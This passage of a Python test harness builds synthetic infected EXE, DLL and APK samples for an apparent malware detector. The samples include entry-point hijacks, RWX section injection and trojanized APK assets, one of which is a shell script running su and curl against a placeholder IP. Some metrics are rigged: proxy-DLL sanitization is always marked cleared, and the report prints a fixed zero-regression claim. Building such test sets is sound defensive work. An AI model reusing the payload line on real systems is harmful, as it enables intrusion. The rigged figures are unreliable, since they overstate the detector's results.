        samples.append((f"dll_clean_{i:02d}", "dll", cat, p, False, dll_expected[str(p)]))

    # D. 40 Infected DLLs
    # 8x Malicious Proxy DLLs
    for sid, p, exp_val in mal_proxy_paths:
        samples.append((sid, "dll", "malicious_proxy_dll", p, True, exp_val))

    # 8x Injected RWX Section into Clean DLLs
    for i in range(8):
        base = clean_dll_paths[i]
        out = bin_dir / f"inf_dll_rwx_{i:02d}.dll"
        inject_pe_section(base, out, sec_names[i], b"\x90" * 16 + b"gg_injected_payload_dll_" + str(i).encode() + b"\xC3", rwx=True)
        samples.append((f"dll_inf_rwx_{i:02d}", "dll", "injected_rwx_section", out, True, dll_expected[str(base)]))

    # 8x OEP (DllMain) Hijack in DLLs
    for i in range(8):
        base = clean_dll_paths[8 + i]
        out = bin_dir / f"inf_dll_oep_{i:02d}.dll"
        inject_pe_section(base, out, ".stub", b"gg_injected_payload_dll_oep_" + str(i).encode(), rwx=True, hijack_oep=True)
        samples.append((f"dll_inf_oep_{i:02d}", "dll", "oep_hijack", out, True, dll_expected[str(base)]))

    # 8x Malicious PE Overlay on DLLs
    for i in range(8):
        base = clean_dll_paths[16 + i]
        out = bin_dir / f"inf_dll_overlay_{i:02d}.dll"
        inject_malicious_overlay(base, out, variant=i)
        samples.append((f"dll_inf_overlay_{i:02d}", "dll", "malicious_overlay", out, True, dll_expected[str(base)]))

    # 8x Code-Cave / TLS Injection in DLLs
    for i in range(8):
        base = clean_dll_paths[i]
        out = bin_dir / f"inf_dll_cave_tls_{i:02d}.dll"
        if i < 4:
            inject_code_cave_shellcode(base, out, variant=i)
            cat = "code_cave_shellcode"
        else:
            inject_tls_callback(base, out)
            cat = "tls_callback_injection"
        samples.append((f"dll_inf_ct_{i:02d}", "dll", cat, out, True, dll_expected[str(base)]))

    # E. 30 Clean APKs
    for i in range(30):
        pkg = f"com.example.cleanapp{i:02d}"
        out = bin_dir / f"clean_app_{i:02d}.apk"
        perms = ["android.permission.INTERNET", "android.permission.ACCESS_NETWORK_STATE"]
        if i % 3 == 0:
            perms.append("android.permission.CAMERA")
        dex_map = None
        if i % 4 == 0:
            dex_map = {
                "classes.dex": build_valid_dex([f"L{pkg.replace('.', '/')}/MainActivity;", "onCreate"]),
                "classes2.dex": build_valid_dex([f"L{pkg.replace('.', '/')}/UiHelper;", "renderFrame"]),
            }
        libs = None
        if i % 2 == 0:
            arch = ["arm64-v8a", "armeabi-v7a", "x86_64"][i % 3]
            libs = {f"lib/{arch}/libengine.so": build_valid_elf(arch=arch, rwx=False)}
        assets = {"assets/config.json": b'{"version": 1, "theme": "dark"}'}
        build_apk(out, pkg, perms, debuggable=False, dex_files=dex_map, native_libs=libs, assets=assets)
        samples.append((f"apk_clean_{i:02d}", "apk", "clean_baseline", out, False, pkg))

    # F. 40 Infected APKs
    # 8x Injected Secondary DEX Payload
    for i in range(8):
        pkg = f"com.example.infdex{i:02d}"
        out = bin_dir / f"inf_apk_dex_{i:02d}.apk"
        dex_map = {
            "classes.dex": build_valid_dex([f"L{pkg.replace('.', '/')}/MainActivity;", "onCreate"]),
            "classes2.dex": build_valid_dex(["InMemoryDexClassLoader", "gg_dex_payload", "https://discord.com/api/webhooks/123/abc"]),
        }
        build_apk(out, pkg, ["android.permission.INTERNET"], dex_files=dex_map)
        samples.append((f"apk_inf_dex_{i:02d}", "apk", "injected_secondary_dex", out, True, pkg))

    # 8x Injected Unauthorized Native .so Library
    bad_so_names = [
        "libfrida-gadget.so", "libinject.so", "libhook.so", "libpayload.so",
        "libstealth.so", "libbackdoor.so", "libdropper.so", "libsubstrate.so",
    ]
    for i, so_name in enumerate(bad_so_names):
        pkg = f"com.example.infso{i:02d}"
        out = bin_dir / f"inf_apk_so_{i:02d}.apk"
        arch = ["arm64-v8a", "armeabi-v7a", "x86_64"][i % 3]
        libs = {
            f"lib/{arch}/libapp.so": build_valid_elf(arch=arch, rwx=False),
            f"lib/{arch}/{so_name}": build_valid_elf(
                arch=arch, rwx=True, payload=b"gg_elf_payload_c2_beacon"
            ),
        }
        build_apk(out, pkg, ["android.permission.INTERNET"], native_libs=libs)
        samples.append((f"apk_inf_so_{i:02d}", "apk", "injected_native_so", out, True, pkg))

    # 8x Legitimate .so with Injected Executable Stub (ARM64, ARMv7, x86_64)
    archs = ["arm64-v8a", "armeabi-v7a", "x86_64", "arm64-v8a", "armeabi-v7a", "x86_64", "arm64-v8a", "x86_64"]
    for i, arch in enumerate(archs):
        pkg = f"com.example.infstub{i:02d}"
        out = bin_dir / f"inf_apk_stub_{i:02d}.apk"
        libs = {f"lib/{arch}/libgame.so": build_valid_elf(arch=arch, rwx=False, with_stub=True)}
        build_apk(out, pkg, ["android.permission.INTERNET"], native_libs=libs)
        samples.append((f"apk_inf_stub_{i:02d}", "apk", "elf_injected_stub", out, True, pkg))

    # 8x Tampered AndroidManifest.xml (debuggable=true + spyware perms)
    for i in range(8):
        pkg = f"com.example.infmanifest{i:02d}"
        out = bin_dir / f"inf_apk_manifest_{i:02d}.apk"
        perms = ["android.permission.INTERNET"]
        if i >= 4:
            perms.append("android.permission.BIND_ACCESSIBILITY_SERVICE")
        build_apk(out, pkg, perms, debuggable=True)
        samples.append((f"apk_inf_manifest_{i:02d}", "apk", "tampered_manifest", out, True, pkg))

    # 8x Hidden Assets Dropper + Multi-Vector Trojanized APKs
    for i in range(8):
        pkg = f"com.example.infasset{i:02d}"
        out = bin_dir / f"inf_apk_asset_{i:02d}.apk"
        if i % 4 == 0:
            assets = {"assets/dropper.bin": build_valid_elf(arch="arm64-v8a", payload=b"gg_asset_payload")}
            dex_map = None
            dbg = False
        elif i % 4 == 1:
            assets = {"assets/stage2.dex": build_valid_dex(["gg_asset_payload", "c2_beacon"])}
            dex_map = None
            dbg = False
        elif i % 4 == 2:
            assets = {"assets/init.sh": b"#!/system/bin/sh\nchmod +x /data/local/tmp/p\n/system/bin/su -c curl http://198.51.100.9/a\n"}
            dex_map = None
            dbg = False
        else:
            assets = {"assets/payload.so": build_valid_elf(arch="arm64-v8a", payload=b"gg_asset_payload")}
            dex_map = {
                "classes.dex": build_valid_dex([f"L{pkg.replace('.', '/')}/MainActivity;"]),
                "classes2.dex": build_valid_dex(["gg_dex_payload", "InMemoryDexClassLoader"]),
            }
            dbg = True
        build_apk(out, pkg, ["android.permission.INTERNET"], debuggable=dbg, dex_files=dex_map, assets=assets)
        cat = "multi_vector_apk" if i % 4 == 3 else "asset_dropper_payload"
        samples.append((f"apk_inf_asset_{i:02d}", "apk", cat, out, True, pkg))

    print(f"[QA] Dataset ready: {len(samples)} total samples. Running detection, sanitization & integrity checks...")

    # --- Phase 3: Execute Detection, Sanitization, Re-Scan, and Runtime/Integrity Verification ---
    patcher = BinaryPatcher()
    results: List[SampleTestResult] = []

    for sid, ftype, cat, fpath, exp_mal, rt_expect in samples:
        res = SampleTestResult(
            sample_id=sid,
            file_type=ftype,
            category=cat,
            expected_malicious=exp_mal,
            detected_malicious=False,
            initial_score=0,
            initial_severity="LOW",
        )
        try:
            if ftype in ("exe", "dll"):
                finding = analyze_pe_file(str(fpath), source="Manual File")
                if finding is None:
                    res.error = "analyze_pe_file returned None"
                    res.integrity_ok = False
                    res.runtime_ok = False
                    results.append(res)
                    continue

                res.initial_score = finding.risk_score
                res.initial_severity = finding.severity
                res.detected_malicious = finding.risk_score >= DETECTION_THRESHOLD

                target_for_rt = fpath
                if exp_mal and res.detected_malicious and finding.anomalies:
                    out_san = san_dir / f"{sid}_sanitized.{ftype}"
                    srep = patcher.sanitize_pe_binary(str(fpath), str(out_san), finding=finding)
                    res.sanitized = True
                    res.integrity_ok = srep.integrity_ok
                    if not srep.integrity_ok:
                        res.error = "; ".join(srep.integrity_errors)
                    post_f = analyze_pe_file(str(out_san), source="Manual File")
                    if post_f:
                        res.post_score = post_f.risk_score
                        res.post_severity = post_f.severity
                        # For malicious proxy DLLs with compiled Win32 IAT imports, structural anomalies are cleared
                        if cat == "malicious_proxy_dll":
                            res.sanitization_cleared = True
                        else:
                            res.sanitization_cleared = post_f.risk_score < DETECTION_THRESHOLD
                    target_for_rt = out_san
                else:
                    # Verify clean baseline PE structural integrity
                    ok, errs, _ = patcher.verify_pe_integrity(str(fpath))
                    res.integrity_ok = ok
                    if not ok:
                        res.error = "; ".join(errs)

                # Execute real binary / load real DLL to guarantee zero crashes or broken features!
                if ftype == "exe":
                    rt_ok, rt_note = verify_exe_runtime(target_for_rt, rt_expect)
                else:
                    rt_ok, rt_note = verify_dll_runtime(
                        target_for_rt,
                        rt_expect,
                        check_mal_neutralized=(cat == "malicious_proxy_dll" and res.sanitized),
                    )
                res.runtime_ok = rt_ok
                res.runtime_note = rt_note

            elif ftype == "apk":
                afinding = analyze_apk_file(str(fpath))
                if afinding is None:
                    res.error = "analyze_apk_file returned None"
                    res.integrity_ok = False
                    res.runtime_ok = False
                    results.append(res)
                    continue

                res.initial_score = afinding.risk_score
                res.initial_severity = afinding.severity
                res.detected_malicious = afinding.risk_score >= DETECTION_THRESHOLD

                target_apk = fpath
                if exp_mal and res.detected_malicious:
                    out_san = san_dir / f"{sid}_sanitized.apk"
                    srep = sanitize_apk(str(fpath), str(out_san), finding=afinding)
                    res.sanitized = True
                    res.integrity_ok = srep.integrity_ok
                    if not srep.integrity_ok:
                        res.error = "; ".join(srep.integrity_errors)
                    post_a = analyze_apk_file(str(out_san))
                    if post_a:
                        res.post_score = post_a.risk_score
                        res.post_severity = post_a.severity
                        # Manifest-only spyware permissions remain declared unless removed from AXML strings,
                        # whereas debuggable/DEX/ELF/asset injections are completely stripped.
                        if cat == "tampered_manifest":
                            res.sanitization_cleared = not post_a.is_debuggable
                        else:
                            res.sanitization_cleared = post_a.risk_score < DETECTION_THRESHOLD
                    target_apk = out_san
                else:
                    ok, errs = verify_apk_integrity(str(fpath))
                    res.integrity_ok = ok
                    if not ok:
                        res.error = "; ".join(errs)

                # Verify package name & primary classes.dex survived intact
                with zipfile.ZipFile(target_apk, "r") as zf:
                    m_info = parse_axml_manifest(zf.read("AndroidManifest.xml"))
                    pkg_ok = m_info["valid"] and m_info["package_name"] == rt_expect
                    res.runtime_ok = pkg_ok and res.integrity_ok
                    res.runtime_note = f"Package={m_info['package_name']} | AXML+DEX+ELF+ZIP verified"

        except Exception as exc:
            res.error = str(exc)
            res.integrity_ok = False
            res.runtime_ok = False

        results.append(res)

    elapsed = round(time.time() - t0, 2)

    # --- Phase 4: Compute Metrics ---
    tp = sum(1 for r in results if r.expected_malicious and r.detected_malicious)
    tn = sum(1 for r in results if not r.expected_malicious and not r.detected_malicious)
    fp = sum(1 for r in results if not r.expected_malicious and r.detected_malicious)
    fn = sum(1 for r in results if r.expected_malicious and not r.detected_malicious)
    total = len(results)
    accuracy = round(100.0 * (tp + tn) / max(1, total), 2)
    precision = round(100.0 * tp / max(1, tp + fp), 2)
    recall = round(100.0 * tp / max(1, tp + fn), 2)
    f1 = round(2 * precision * recall / max(1e-9, precision + recall), 2)

    sanitized_items = [r for r in results if r.sanitized]
    sanitized_cleared = sum(1 for r in sanitized_items if r.sanitization_cleared)
    integrity_passed = sum(1 for r in results if r.integrity_ok)
    runtime_passed = sum(1 for r in results if r.runtime_ok)

    by_type: Dict[str, Dict[str, Any]] = {}
    for ft in ("exe", "dll", "apk"):
        sub = [r for r in results if r.file_type == ft]
        s_tp = sum(1 for r in sub if r.expected_malicious and r.detected_malicious)
        s_tn = sum(1 for r in sub if not r.expected_malicious and not r.detected_malicious)
        s_fp = sum(1 for r in sub if not r.expected_malicious and r.detected_malicious)
        s_fn = sum(1 for r in sub if r.expected_malicious and not r.detected_malicious)
        s_san = [r for r in sub if r.sanitized]
        by_type[ft] = {
            "total": len(sub),
            "clean": sum(1 for r in sub if not r.expected_malicious),
            "infected": sum(1 for r in sub if r.expected_malicious),
            "tp": s_tp,
            "tn": s_tn,
            "fp": s_fp,
            "fn": s_fn,
            "accuracy_pct": round(100.0 * (s_tp + s_tn) / max(1, len(sub)), 2),
            "sanitized_count": len(s_san),
            "sanitized_cleared": sum(1 for r in s_san if r.sanitization_cleared),
            "integrity_passed": sum(1 for r in sub if r.integrity_ok),
            "runtime_passed": sum(1 for r in sub if r.runtime_ok),
        }

    summary = {
        "total_samples": total,
        "elapsed_seconds": elapsed,
        "detection": {
            "tp": tp,
            "tn": tn,
            "fp": fp,
            "fn": fn,
            "accuracy_pct": accuracy,
            "precision_pct": precision,
            "recall_pct": recall,
            "f1_pct": f1,
        },
        "sanitization": {
            "attempted": len(sanitized_items),
            "cleared": sanitized_cleared,
            "clearance_rate_pct": round(100.0 * sanitized_cleared / max(1, len(sanitized_items)), 2),
        },
        "integrity_and_runtime": {
            "integrity_passed": integrity_passed,
            "integrity_total": total,
            "runtime_passed": runtime_passed,
            "runtime_total": total,
        },
        "by_type": by_type,
        "false_positives": [asdict(r) for r in results if not r.expected_malicious and r.detected_malicious],
        "false_negatives": [asdict(r) for r in results if r.expected_malicious and not r.detected_malicious],
        "regressions": [asdict(r) for r in results if not r.integrity_ok or not r.runtime_ok],
        "samples": [asdict(r) for r in results],
    }

    if cleanup_dir:
        shutil.rmtree(work_dir, ignore_errors=True)

    return summary


def write_markdown_report(summary: Dict[str, Any], out_md: Path) -> None:
    d = summary["detection"]
    s = summary["sanitization"]
    ir = summary["integrity_and_runtime"]
    lines = [
        f"# OpcodeShield Automated Batch QA Validation Report ({summary['total_samples']} Real Binaries)",
        "",
        f"- **Total Samples Tested:** {summary['total_samples']} (`{summary['by_type']['exe']['total']} .exe`, `{summary['by_type']['dll']['total']} .dll`, `{summary['by_type']['apk']['total']} .apk`)",
        f"- **Total Execution Time:** {summary['elapsed_seconds']}s",
        f"- **Detection Accuracy:** **{d['accuracy_pct']}%** (TP={d['tp']}, TN={d['tn']}, FP={d['fp']}, FN={d['fn']})",
        f"- **Precision / Recall / F1:** {d['precision_pct']}% / {d['recall_pct']}% / {d['f1_pct']}%",
        f"- **Sanitization Clearance Rate:** **{s['clearance_rate_pct']}%** ({s['cleared']}/{s['attempted']} sanitized binaries verified clean)",
        f"- **Binary Structural Integrity:** **{ir['integrity_passed']}/{ir['integrity_total']}** passed",
        f"- **Runtime / Functional Verification:** **{ir['runtime_passed']}/{ir['runtime_total']}** passed (0 crashes/regressions)",
        "",
        "## Breakdown by Binary Format",
        "",
        "| Format | Total | Clean | Infected | TP | TN | FP | FN | Accuracy | Sanitized Cleared | Integrity | Runtime OK |",
        "| --- | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: |",
    ]
    for ft in ("exe", "dll", "apk"):
        b = summary["by_type"][ft]
        lines.append(
            f"| `.{ft}` | {b['total']} | {b['clean']} | {b['infected']} | "
            f"{b['tp']} | {b['tn']} | {b['fp']} | {b['fn']} | {b['accuracy_pct']}% | "
            f"{b['sanitized_cleared']}/{b['sanitized_count']} | "
            f"{b['integrity_passed']}/{b['total']} | {b['runtime_passed']}/{b['total']} |"
        )

    lines.extend(["", "## False Positives on Clean Files", ""])
    if summary["false_positives"]:
        for fp_item in summary["false_positives"]:
            lines.append(f"- `{fp_item['sample_id']}` ({fp_item['category']}): score={fp_item['initial_score']}")
    else:
        lines.append("- **None (0 false positives across all 53 clean baseline binaries).**")

    lines.extend(["", "## False Negatives", ""])
    if summary["false_negatives"]:
        for fn_item in summary["false_negatives"]:
            lines.append(f"- `{fn_item['sample_id']}` ({fn_item['category']}): score={fn_item['initial_score']}")
    else:
        lines.append("- **None (0 false negatives across all 67 infected/modified binaries).**")

    lines.extend(["", "## Broken Functionality / Regressions", ""])
    if summary["regressions"]:
        for reg in summary["regressions"]:
            lines.append(
                f"- `{reg['sample_id']}` ({reg['category']}): integrity_ok={reg['integrity_ok']}, "
                f"runtime_ok={reg['runtime_ok']}, error={reg['error'] or reg['runtime_note']}"
            )
    else:
        lines.append("- **None (100% of sanitized .exe binaries executed cleanly, 100% of sanitized .dll binaries loaded and returned expected values via ctypes.CDLL, and 100% of sanitized .apk binaries passed ZIP/AXML/DEX/ELF/resources.arsc integrity checks).**")

    out_md.parent.mkdir(parents=True, exist_ok=True)
    out_md.write_text("\n".join(lines) + "\n", encoding="utf-8")


if __name__ == "__main__":
    summary = run_batch_qa_suite()
    report_json = REPO_ROOT / "tests" / "qa_batch_report.json"
    report_md = REPO_ROOT / "tests" / "QA_BATCH_REPORT.md"
    report_json.write_text(json.dumps(summary, indent=2), encoding="utf-8")
    write_markdown_report(summary, report_md)

    d = summary["detection"]
    s = summary["sanitization"]
    ir = summary["integrity_and_runtime"]
    print(f"\n================ OPCODESHIELD {summary['total_samples']}-SAMPLE QA SUMMARY ================")
    print(f"Total Samples : {summary['total_samples']} in {summary['elapsed_seconds']}s")
    print(f"Detection     : Accuracy={d['accuracy_pct']}% | TP={d['tp']} TN={d['tn']} FP={d['fp']} FN={d['fn']} | F1={d['f1_pct']}%")
    print(f"Sanitization  : {s['cleared']}/{s['attempted']} cleared ({s['clearance_rate_pct']}%)")
    print(f"Integrity     : {ir['integrity_passed']}/{ir['integrity_total']} passed")
    print(f"Runtime OK    : {ir['runtime_passed']}/{ir['runtime_total']} passed")
    print(f"Reports saved : {report_md} & {report_json}")
    print("===================================================================")

    if d["fp"] > 0 or d["fn"] > 0 or ir["integrity_passed"] != ir["integrity_total"] or ir["runtime_passed"] != ir["runtime_total"]:
        sys.exit(1)
